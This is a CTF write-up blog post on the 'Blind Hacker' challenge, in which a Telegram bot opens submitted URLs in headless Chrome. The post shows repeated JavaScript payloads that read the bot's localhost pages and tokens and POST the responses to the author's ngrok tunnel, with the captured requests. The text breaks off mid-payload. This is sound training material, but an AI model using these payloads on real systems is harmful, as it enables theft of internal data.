@@ -1,0 +1,1222 @@
+<!DOCTYPE html><html lang="en"><head>
+    
+      <title>
+        Fwhibbit CTR (CTF): Solving Blind Hacker ::
+        jorgectf — blog
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<meta name="description" content="Fwhibbit CTR (CTF): Solving Blind Hacker."/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="https://jorgectf.gitlab.io/blog/post/ctr-writeup-blind_hacker/"/>
+
+
+
+
+
+<link rel="stylesheet" href="https://jorgectf.gitlab.io/blog/assets/style.css"/>
+
+<link rel="stylesheet" href="https://jorgectf.gitlab.io/blog/style.css"/>
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://jorgectf.gitlab.io/blog/img/apple-touch-icon-144-precomposed.png"/>
+<link rel="shortcut icon" href="https://jorgectf.gitlab.io/blog/img/favicon.png"/>
+
+
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Fwhibbit CTR (CTF): Solving Blind Hacker"/>
+<meta name="twitter:description" content="Fwhibbit CTR (CTF): Solving Blind Hacker."/>
+
+
+
+<meta property="og:title" content="Fwhibbit CTR (CTF): Solving Blind Hacker"/>
+<meta property="og:description" content="Fwhibbit CTR (CTF): Solving Blind Hacker."/>
+<meta property="og:type" content="article"/>
+<meta property="og:url" content="https://jorgectf.gitlab.io/blog/post/ctr-writeup-blind_hacker/"/><meta property="article:section" content="post"/>
+<meta property="article:published_time" content="2020-04-30T14:55:00+00:00"/>
+<meta property="article:modified_time" content="2020-04-30T14:55:00+00:00"/><meta property="og:site_name" content="jorgectf"/>
+
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="https://jorgectf.gitlab.io/blog/" class="logo" style="text-decoration: none;">
+  
+  <img src="https://jorgectf.gitlab.io/blog/logo.png" alt="jorgectf"/>
+  
+</a>
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+    
+    
+    <li><a href="https://jorgectf.gitbook.io/awae-oswe-preparation-resources/">OSWE Cheatsheet</a></li>
+    
+    
+    
+    <li><a href="https://jorgectf.gitlab.io/blog/research/">Research</a></li>
+    
+    
+    <li><a href="../">About</a></li>
+    
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+    
+    <li><a href="https://jorgectf.gitbook.io/awae-oswe-preparation-resources/">OSWE Cheatsheet</a></li>
+    
+    
+    
+    <li><a href="https://jorgectf.gitlab.io/blog/research/">Research</a></li>
+    
+    
+    <li><a href="../">About</a></li>
+  </ul>
+</nav>
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"></path>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"></path>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title">Fwhibbit CTR (CTF): Solving Blind Hacker</h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2020-04-30
+        </span>
+
+        
+          
+        
+      
+
+      
+
+
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/fwhibbit/">#Fwhibbit</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/ctf/">#CTF</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/web/">#Web</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/php/">#PHP</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/loosecomparison/">#LooseComparison</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/typejuggling/">#TypeJuggling</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/racecondition/">#RaceCondition</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/parse_url/">#Parse_URL</a> 
+        
+      </span>
+    
+
+    
+
+    <div class="post-content">
+      
+      <h1 id="tldr">TL;DR</h1>
+<p>This post is the next one of the solutions for the challenges I’ve done for <a href="https://ctf.fwhibbit.es/register" target="_blank">Fwhibbit&amp;rsquo;s CTF</a>. Go to the first post <a href="https://jorgectf.gitlab.io/post/ctr-writeup-mike/" target="_blank">solving &amp;ldquo;Mike&amp;rsquo;s Dungeon&amp;rdquo;</a> to see how to solve it.</p>
+<h2 id="disclaimer">DISCLAIMER</h2>
+<p>I have no degree in computer science, programming, cybersecurity… Mistakes can appear (and they will) so please keep it in mind. (If any, I’d thank you for contacting me via <a href="https://t.me/jorgectf" target="_blank">Telegram</a> or <a href="https://twitter.com/jorge_ctf" target="_blank">Twitter</a>) :D</p>
+<h1 id="challenge">Challenge</h1>
+<p><img src="https://jorgectf.gitlab.io/blog/static/fwhibbit/blind_hacker-1.png" alt=""/></p>
+<p>Challenge information:</p>
+<p><img src="https://jorgectf.gitlab.io/blog/static/fwhibbit/blind_hacker-2.png" alt=""/></p>
+<p><a href="https://github.com/jorgectf/Created-CTF-Challenges/tree/main/challenges/Blind%20Hacker%20@%20Fwhibbit%20CTR%202020" target="_blank">Download</a></p>
+<h1 id="fast-solution-no-explanation">Fast Solution (No explanation)</h1>
+<p>In this section, Im going to leave here the raw requests that had to be done to complete the challenge. If you want a explanation about it, scroll down!</p>
+<h1 id="explained-solution">Explained solution</h1>
+<h2 id="first-stage">First stage</h2>
+<p>First of all, we face a telegram bot:</p>
+<p><img src="https://jorgectf.gitlab.io/blog/static/fwhibbit/blind_hacker-3.png" alt=""/></p>
+<pre tabindex="0"><code>/start
+</code></pre><pre tabindex="0"><code>Welcome to the Blind Hacker Bot
+
+Send me your website and I will be opening it to test for vulnerabilities for 10 seconds.
+(Example) /scan URL
+</code></pre><p>Having read this, we can try to set up a server to receive the connection and see what are we facing. For this kind of challenges, I like using <a href="https://ngrok.com/download" target="_blank">Ngrok</a> tunneling it with burp to propperly see the requests done.</p>
+<pre tabindex="0"><code>$ ngrok http 8081
+</code></pre><p>This will forward the connections to the tunel ngrok gives you, to your localhost:8081 in this case. This way, we can configure Burpsuite to see the traffic and send back the data to the actual web server.</p>
+<p><img src="https://jorgectf.gitlab.io/blog/static/fwhibbit/blind_hacker-4.png" alt=""/></p>
+<hr/>
+<h2 id="example">Example</h2>
+<p>Webserver’s index.html</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;
+&lt;<span style="color:#f92672">script</span>&gt;
+
+<span style="color:#a6e22e">first</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#e6db74">&#34;NGROK-TUNNEL&#34;</span>);
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;POST-DATA-TRY&#34;</span>);
+
+&lt;/<span style="color:#f92672">script</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><p>Triggering the browser:</p>
+<pre tabindex="0"><code>/scan NGROK-TUNNEL/index.html
+</code></pre><p>First request fetching index.html</p>
+<pre tabindex="0"><code>GET /index.html HTTP/1.1
+Host: NGROK-TUNNEL
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/81.0.4044.129 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+Connection: close
+</code></pre><p>Second request meanwhile executing the “injected” javascript.</p>
+<pre tabindex="0"><code>POST / HTTP/1.1
+Host: NGROK-TUNNEL
+Content-Length: 13
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/81.0.4044.129 Safari/537.36
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Referer: http://NGROK-TUNNEL/index.html
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+Connection: close
+
+POST-DATA-TRY
+</code></pre><p>Now we can exfiltrate the data of the response by making a POST request to our server with the requestText from the first request as the body.</p>
+<hr/>
+<p>Let’s begin to see what can be done accessing localhost.</p>
+<h4 id="html-content">HTML content</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;
+&lt;<span style="color:#f92672">script</span>&gt;
+
+<span style="color:#a6e22e">first</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;http://localhost/index.php&#34;</span>);
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">onreadystatechange</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">XMLHttpRequest</span>.<span style="color:#a6e22e">DONE</span>) {
+                <span style="color:#a6e22e">second</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#e6db74">&#34;http://NGROK-TUNNEL/exfiltration&#34;</span>);
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">responseText</span>);
+        }
+}
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">send</span>();
+
+&lt;/<span style="color:#f92672">script</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><p>In this case I’m targeting /index.php because otherwise, index.html will be targeted (I’m using the same web server for hosting the challenge and the solution).</p>
+<h4 id="response">Response</h4>
+<pre tabindex="0"><code>POST /exfiltration HTTP/1.1
+Host: NGROK-TUNNEL
+Content-Length: 30
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/81.0.4044.129 Safari/537.36
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Referer: http://NGROK-TUNNEL/index.html
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+Connection: close
+
+indextoken param not supplied.
+</code></pre><p>As it is talking about a parameter, we could think about a GET parameter called “indextoken”, so let’s try adding it randomly to pass <code>isset($_GET[&#39;indextoken&#39;])</code>.</p>
+<h4 id="html-content-1">HTML content</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;
+&lt;<span style="color:#f92672">script</span>&gt;
+
+<span style="color:#a6e22e">first</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;http://localhost/index.php?indextoken=whatever&#34;</span>);
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">onreadystatechange</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">XMLHttpRequest</span>.<span style="color:#a6e22e">DONE</span>) {
+                <span style="color:#a6e22e">second</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#e6db74">&#34;NGROK-TUNNEL/exfiltration&#34;</span>);
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">responseText</span>);
+        }
+}
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">send</span>();
+
+&lt;/<span style="color:#f92672">script</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><h4 id="response-1">Response</h4>
+<pre tabindex="0"><code>POST /exfiltration HTTP/1.1
+Host: NGROK-TUNNEL
+Content-Length: 38
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/81.0.4044.129 Safari/537.36
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Referer: http://NGROK-TUNNEL/index.html
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+Connection: close
+
+Invalid token! Have you met token.php?
+</code></pre><p>It seems we have to get a token from token.php to have an authentication to access. Let’s see what token.php give us.</p>
+<h4 id="html-content-2">HTML content</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;
+&lt;<span style="color:#f92672">script</span>&gt;
+
+<span style="color:#a6e22e">first</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;http://localhost/token.php&#34;</span>);
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">onreadystatechange</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">XMLHttpRequest</span>.<span style="color:#a6e22e">DONE</span>) {
+                <span style="color:#a6e22e">second</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#e6db74">&#34;NGROK-TUNNEL/exfiltration&#34;</span>);
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">responseText</span>);
+        }
+}
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">send</span>();
+
+&lt;/<span style="color:#f92672">script</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><h4 id="response-2">Response</h4>
+<pre tabindex="0"><code>POST /exfiltration HTTP/1.1
+Host: fa79d7a6.ngrok.io
+Content-Length: 56
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/81.0.4044.129 Safari/537.36
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Referer: NGROK-TUNNEL/index.html
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+Connection: close
+
+There you go -&gt; tygpr4xVVELijwHB47QBLrHtQRh2opi6xrUEVYyk
+</code></pre><p>We now get a 40 length set of characters randomly generated that will allow us to access index.php for 2 minutes. The database has an event to delete all the generated tokens after that period of time:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">CREATE</span> EVENT drop_indextokens <span style="color:#66d9ef">ON</span> SCHEDULE <span style="color:#66d9ef">EVERY</span> <span style="color:#ae81ff">2</span> <span style="color:#66d9ef">MINUTE</span> STARTS <span style="color:#66d9ef">CURRENT_TIMESTAMP</span> <span style="color:#66d9ef">DO</span> <span style="color:#66d9ef">DELETE</span> <span style="color:#66d9ef">FROM</span> indextokens;
+</code></pre></div><p>So we should make an automatic generation of the token to get access to index every time we trigger the bot. Knowing that it is always 40 characters long, lots of methods can be used.</p>
+<h4 id="html-content-3">HTML content</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;
+&lt;<span style="color:#f92672">script</span>&gt;
+
+<span style="color:#a6e22e">first</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;http://localhost/token.php&#34;</span>);
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">onreadystatechange</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">XMLHttpRequest</span>.<span style="color:#a6e22e">DONE</span>) {
+                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">responseText</span>.<span style="color:#a6e22e">substring</span>(<span style="color:#ae81ff">16</span>);
+                <span style="color:#a6e22e">second</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#e6db74">&#34;NGROK-TUNNEL/exfiltration&#34;</span>);
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;TOKEN: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">token</span>);
+        }
+}
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">send</span>();
+
+&lt;/<span style="color:#f92672">script</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><h4 id="response-3">Response</h4>
+<pre tabindex="0"><code>POST /exfiltration HTTP/1.1
+Host: fa79d7a6.ngrok.io
+Content-Length: 47
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/81.0.4044.129 Safari/537.36
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Referer: NGROK-TUNNEL/index.html
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+Connection: close
+
+TOKEN: Z8kPw0fsTNwaAbDg8eZ3K8DVowCq3bG57UFvN7wE
+</code></pre><p>Now, a third request will have to be done to:</p>
+<ul>
+<li>Get the token</li>
+<li>Submit a request with the token</li>
+<li>Get the responseText</li>
+</ul>
+<h4 id="html-content-4">HTML content</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;
+&lt;<span style="color:#f92672">script</span>&gt;
+
+<span style="color:#a6e22e">first</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;http://localhost/token.php&#34;</span>);
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">onreadystatechange</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">XMLHttpRequest</span>.<span style="color:#a6e22e">DONE</span>) {
+                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">responseText</span>.<span style="color:#a6e22e">substring</span>(<span style="color:#ae81ff">16</span>);
+                <span style="color:#a6e22e">second</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;http://localhost/index.php?indextoken=&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">token</span>);
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">onreadystatechange</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
+                        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">XMLHttpRequest</span>.<span style="color:#a6e22e">DONE</span>) {
+                                <span style="color:#a6e22e">third</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+                                <span style="color:#a6e22e">third</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#e6db74">&#34;NGROK-TUNNEL/exfiltration&#34;</span>);
+                                <span style="color:#a6e22e">third</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">responseText</span>);
+                        }
+                }
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">send</span>();
+        }
+}
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">send</span>();
+
+&lt;/<span style="color:#f92672">script</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><h4 id="response-4">Response</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">POST /exfiltration HTTP/1.1
+Host: fa79d7a6.ngrok.io
+Content-Length: 612
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/81.0.4044.129 Safari/537.36
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Referer: NGROK-TUNNEL/index.html
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+Connection: close
+
+
+&lt;<span style="color:#f92672">html</span>&gt;
+
+&lt;<span style="color:#f92672">h1</span>&gt; BLIND HACKER FORUM &lt;/<span style="color:#f92672">h1</span>&gt;
+
+&lt;<span style="color:#f92672">center</span>&gt;
+        &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;signin-form&#34;</span>&gt;
+            &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;form-element&#34;</span>&gt;
+                &lt;<span style="color:#f92672">label</span>&gt;Username: &lt;/<span style="color:#f92672">label</span>&gt;
+                &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;username&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;username&#34;</span> <span style="color:#a6e22e">required</span> /&gt;
+            &lt;/<span style="color:#f92672">div</span>&gt;
+            &lt;<span style="color:#f92672">br</span>&gt;
+            &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;form-element&#34;</span>&gt;
+                &lt;<span style="color:#f92672">label</span>&gt;Password: &lt;/<span style="color:#f92672">label</span>&gt;
+                &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#a6e22e">required</span> /&gt;
+            &lt;/<span style="color:#f92672">div</span>&gt;
+            &lt;<span style="color:#f92672">br</span>&gt;
+            &lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;login&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;login&#34;</span>&gt;Log In&lt;/<span style="color:#f92672">button</span>&gt;
+        &lt;/<span style="color:#f92672">form</span>&gt;
+&lt;/<span style="color:#f92672">center</span>&gt;
+
+
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><p>We have the source of the page! Now we can interact with it without having to deal with the token, as it is already automatised. It can be seen that there’s a login form with a username and password POST parameters. (A login one will be sent too when using a browser, but this time it is not requested on the backend)</p>
+<p>Let’s try send some credentials.</p>
+<h4 id="html-content-5">HTML content</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;
+&lt;<span style="color:#f92672">script</span>&gt;
+
+<span style="color:#a6e22e">first</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;http://localhost/token.php&#34;</span>);
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">onreadystatechange</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">XMLHttpRequest</span>.<span style="color:#a6e22e">DONE</span>) {
+                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">responseText</span>.<span style="color:#a6e22e">substring</span>(<span style="color:#ae81ff">16</span>);
+                <span style="color:#a6e22e">second</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#e6db74">&#34;http://localhost/index.php?indextoken=&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">token</span>);
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">onreadystatechange</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
+                        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">XMLHttpRequest</span>.<span style="color:#a6e22e">DONE</span>) {
